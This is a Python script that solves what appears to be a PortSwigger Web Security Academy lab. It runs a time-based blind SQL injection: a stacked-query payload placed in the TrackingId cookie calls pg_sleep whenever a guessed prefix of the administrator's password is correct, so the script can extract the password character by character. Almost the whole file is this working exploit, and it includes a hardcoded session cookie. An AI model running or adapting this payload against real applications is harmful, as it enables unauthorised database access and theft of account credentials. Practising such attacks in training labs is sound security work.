import requests
import string

alphanumeric_lower = string.digits + string.ascii_lowercase
alphanumeric_lower_list = list(alphanumeric_lower)

# set your url for lab
url = "https://0ab000fc03a85caf80fef319000700bd.web-security-academy.net/"
password = ""
i = 0

while i < 36:
    guess = password + alphanumeric_lower_list[i]
    lg = len(guess)

    TrackingId = f"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,{lg})='{guess}')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--"
    print(TrackingId)

    cookies = {
        "session": "y7tBJhhO6JK6WPZ4KEgpkrd6GasRfCRI",
        "TrackingId": TrackingId
    }

    response = requests.get(url, cookies=cookies)
    delay = response.elapsed.total_seconds()
    
    if delay > 1:
        password = guess
        i = 0
        print(True)
    else:
        i += 1
        print(False)

print("Password: ", password)